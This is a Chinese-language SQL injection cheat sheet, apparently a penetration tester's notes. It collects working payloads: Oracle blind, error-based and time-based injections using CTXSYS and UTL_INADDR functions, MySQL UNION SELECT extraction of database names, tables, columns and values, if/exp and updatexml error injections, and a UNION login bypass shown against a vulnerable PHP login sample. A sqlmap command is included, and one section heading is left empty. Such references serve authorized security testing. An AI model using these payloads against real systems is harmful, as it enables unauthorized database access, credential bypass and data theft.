## SQL注入

测试注重积累POC，通过插件自动化

### 1.sqlmap

对于找到的疑似参数，建议通过sqlmap指定参数进行自动化扫描：  

sqlmap.py -r request.txt -p "param1,param2" --proxy="http://127.0.0.1:8089" --dbs  

### 2.简单字符注入
select语句的注入，有时需要猜准第一个参数的值，例如此处的用户名admin   

	admin' AND 'XXX'='XXX 
	
	
### 3.简单数字注入 
	admin' AND 1=1   
	admin' AND 1=2

### 4.Oracle 布尔类型盲注
CTXSYS.drithsx.sn 和 CTXSYS.CTX_REPORT.TOKEN_TYPE 是 Oracle 中自带的函数，用于处理文本，当传入参数类型错误时，会返回异常:常用的 payload: ' and 1=ctxsys.drithsx.sn(1,(select user from dual))--  


	admin' AND (SELECT(CASE WHEN(7118=7118）THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7118) END) FROM DUAL) IS NULL AND 'XBBR'='XBBR

	admin' AND (SELECT(CASE WHEN(7118=7118）THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7118) END) FROM DUAL) IS NULL
	
### 5.Oracle 基于错误的注入
基于错误的注入，是利用SQL语句执行的错误，识别回显的差异。  
CTXSYS.drithsx.sn(1, (query))  
CTXSYS.CTX_REPORT.TOKEN_TYPE('', (query))  
UTL_INADDR.get_host_name(query)   
UTL_INADDR.get_host_address(query)  
Oracle 中使用 || 连接字符串。

	回显：KkjzK+查询内容+KkjzK 
	admin' AND 1297=CTXSYS.DRITHSX.SN(1297,(CHR(113)||CHR(107)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (1297=1297) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(106)||CHR(122)||CHR(113))) AND 'JOqN'='JOqN  
	
获取数据库的数量：  
SELECT COUNT(DISTINCT(OWNER)) FROM SYS.ALL_TABLES

获取每一个数据库的名称：  
' AND 7093=CTXSYS.DRITHSX.SN(7093,CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113)||(select OWNER from (SELECT OWNER,ROWNUM AS LIMIT FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES) order by 1 ASC ) WHERE LIMIT=21)||CHR(113)||CHR(120)||CHR(118)||CHR(122)||CHR(113)) AND 'XlYj'='XlYj

	
### 6.Oracle 基于时间的注入
基于AND/OR的时间注入：  

	admin' AND 9102=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'DBEp'='DBEp  
	admin' OR 9102=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'DBEp'='DBEp

### 7.MySQL注释  
SQL注入时经常用到注释的技巧，通过注释掉后面的语句，执行签名注入的语句。  
1. MySQL注释符可以通过#号：`select * form table_name# `    
2. MySQL注释符也可以通过--号，需要注意的是后面必须添加一个空格，在语法识别时，才会当做注释符：`select * from table_name--20%`  

### 8.UNION SELECT 登录
在登录场景中，通过查询username获取查询到的字段，在从查询结果中判断密码是否正确，可以利用第一步查询，通过username进行注入，通过union连接，注入特意伪造的语句，使得第二步判断密码时，取到的值和传入的password正好对应，绕过校验。  

原始代码：  

	$username = $_POST['username'];    
	$password = $_POST['password'];  
	if(filter($username)){  
    //过滤括号  
	}else{  
 	   $sql="SELECT * FROM admin WHERE username='".$username."'";  
 	   $result=mysql_query($sql);   
 	   @$row = mysql_fetch_array($result);  
  	   if(isset($row) && $row['username'] === 'admin'){  
 	       if ($row['password']===md5($password)){  
  	          //Login successful   
        	}else{  
            	die("password error!");  
        	}  
    	}else{  
        	die("username does not exist!");  
    	}  
	} 


伪造密码登录：' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b&password=1   

	username=' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b&password=1
 
	mysql> select * from admin where username='' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b';
	+----+----------+----------------------------------+
	| id | username | password                         |
	+----+----------+----------------------------------+
	|  1 | admin    | c4ca4238a0b923820dcc509a6f75849b |
	+----+----------+----------------------------------+


### 9.order by盲注  
注入时经常使用order by来判断数据库的列数，order by 'number' (asc/desc)，默认是升序，通常配合union select使用，union select会拼接一行结果在执行的结果中，通过order by排序，通过响应的差异寻找利用点。  

select * from users where user_id = '1' union select 1,2,'a',4,5,6,7 order by 3  

通过order by判断语句执行结果的列数：' order by 'number' -- QJR  
(如果超出了列的数量，则会执行异常，所以执行成功最大的number则为列数，然后再利用union控制回显)

### 10. UNION SELECT回显
通过union select注入，通过响应判断是否存在注入：  

	param' UNION ALL SELECT CONCAT(CONCAT('qjqxq','eDCHHALiLFplXopXiAiMRGBsyNkjNThCcfJKEObt'),'qqvzq'),NULL,NULL,NULL-- QJrt

1. 获取数据库名称：2019-02-22' UNION ALL SELECT (select database()),NULL,NULL,NULL#   
2. 获取数据库版本：2019-02-22' UNION ALL SELECT ( select version()),NULL,NULL,NULL#      
3. 获取数据库表：  2019-02-22' UNION ALL SELECT (select table_name from information_schema.tables where table_schema='db_name' limit 2,1),NULL,NULL,NULL#  
4. 获取表的字段：2019-02-22' UNION ALL SELECT (select column_name from information_schema.columns where table_name='table_name' limit 2,1),NULL,NULL,NULL#  
5. 获取字段的值：2019-02-22' UNION ALL SELECT (select account_uuid from table_name limit 1,1),NULL,NULL,NULL#
  

### 11. if(0,1,exp)基于错误注入
if进行条件判断，如果为true,则执行，否则执行后面的。通过响应判断语句的差异（1执行，exp出错，报文长度不一致）是否执行，是否存在注入。  

1. 2019-02-19'-IF(CURRENT_USER = 'root@%',1,EXP(771))#
2. 'and  if(0,1, exp(755)) #
3. 'and  if(1,1, exp(755)) #
4. 'and if(ascii(substr(database(),1,1))=1,1,exp(755))  #

### 12. updatexml基于错误的注入
updatexml(XML_document, XPath_string, new_value);该函数是XML文档处理函数，当传入的参数不是Xpath路径时，则会执行报错。利用报错的场景，可以进行错误注入，可能回显错误信息。  

	'||updatexml(1,if(database() = 'database',1,user()),1)||'


### 13. 数据提交格式变种，绕过检测  


link:  
[Oracle手注](https://blog.csdn.net/niexinming/article/details/48985873?utm_source=blogkpcl14)  
[i春秋SQL注入](https://bbs.ichunqiu.com/thread-41701-1-1.html?from=bkyl)


	

  

	
	

